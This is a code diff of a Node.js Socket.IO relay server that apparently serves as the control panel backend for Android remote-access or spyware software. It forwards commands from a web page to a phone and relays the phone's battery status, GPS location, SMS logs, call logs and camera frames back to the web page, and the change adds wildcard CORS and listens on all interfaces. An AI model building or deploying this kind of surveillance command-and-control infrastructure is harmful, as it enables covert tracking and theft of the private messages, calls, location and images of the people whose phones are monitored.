@@ -1,76 +1,65 @@
 const express = require('express');
-const path = require('path'); // Required to resolve directories
-const app = express();
 const http = require('http');
-const server = http.createServer(app);
+const path = require('path'); // Added to fix the ENOENT error
 const { Server } = require("socket.io");
 
+const app = express();
+const server = http.createServer(app);
+
+// Increase buffer size to 100MB to handle camera images
 const io = new Server(server, {
-  maxHttpBufferSize: 1e8 
+    maxHttpBufferSize: 1e8,
+    cors: {
+        origin: "*",
+        methods: ["GET", "POST"]
+    }
 });
 
 const PORT = process.env.PORT || 3000;
 
-// This serves ALL files in your folder (images, scripts, etc.)
-app.use(express.static(__dirname));
-
+// Correct way to serve the HTML file on Render
 app.get('/', (req, res) => {
-  res.sendFile(path.join(__dirname, 'index.html'));
+    res.sendFile(path.join(__dirname, 'index.html'));
 });
+
+// Serve other static files (like icons or CSS) if they exist
+app.use(express.static(path.join(__dirname)));
+
 io.on('connection', (socket) => {
-  console.log('A user connected: ' + socket.id);
+    console.log('User connected:', socket.id);
 
-  // --- COMMAND FLOW: Web -> Server -> Phone ---
-  socket.on('phone-execute', (cmd) => {
-    console.log('Command received from Web:', cmd);
-    // Broadcast the command to the Android device
-    io.emit('phone-execute', cmd);
-  });
+    // COMMAND: WEB -> PHONE
+    socket.on('phone-execute', (cmd) => {
+        console.log('Sending command to phone:', cmd);
+        io.emit('phone-execute', cmd);
+    });
 
-  // --- DATA FLOW: Phone -> Server -> Web ---
+    // DATA: PHONE -> WEB
+    socket.on('battery-update', (data) => {
+        io.emit('battery-update', data);
+    });
 
-  // 1. Handle Battery Updates
-  socket.on('battery-update', (data) => {
-    console.log('Battery Level:', data);
-    io.emit('battery-update', data);
-  });
+    socket.on('location-update', (data) => {
+        io.emit('location-update', data);
+    });
 
-  // 2. Handle GPS/Location Updates
-  socket.on('location-update', (data) => {
-    console.log('Location received:', data);
-    io.emit('location-update', data);
-  });
+    socket.on('sms-data', (data) => {
+        io.emit('sms-data', data);
+    });
 
-  // 3. Handle Camera Image Streams (Base64)
-  socket.on('data-stream', (base64Data) => {
-    console.log('Camera frame received');
-    io.emit('data-stream', base64Data);
-  });
+    socket.on('call-data', (data) => {
+        io.emit('call-data', data);
+    });
 
-  // 4. Handle SMS Logs
-  socket.on('sms-data', (data) => {
-    console.log('SMS Data received');
-    io.emit('sms-data', data);
-  });
+    socket.on('data-stream', (data) => {
+        io.emit('data-stream', data);
+    });
 
-  // 5. Handle Call Logs
-  socket.on('call-data', (data) => {
-    console.log('Call Log data received');
-    io.emit('call-data', data);
-  });
-
-  // 6. Handle File Manager Data
-  socket.on('file-data', (data) => {
-    console.log('File list received');
-    io.emit('file-data', data);
-  });
-
-  socket.on('disconnect', () => {
-    console.log('User disconnected');
-  });
+    socket.on('disconnect', () => {
+        console.log('User disconnected');
+    });
 });
 
-server.listen(PORT, () => {
-  console.log(`Server listening on port ${PORT}`);
+server.listen(PORT, '0.0.0.0', () => {
+    console.log(`Server is running on port ${PORT}`);
 });
-
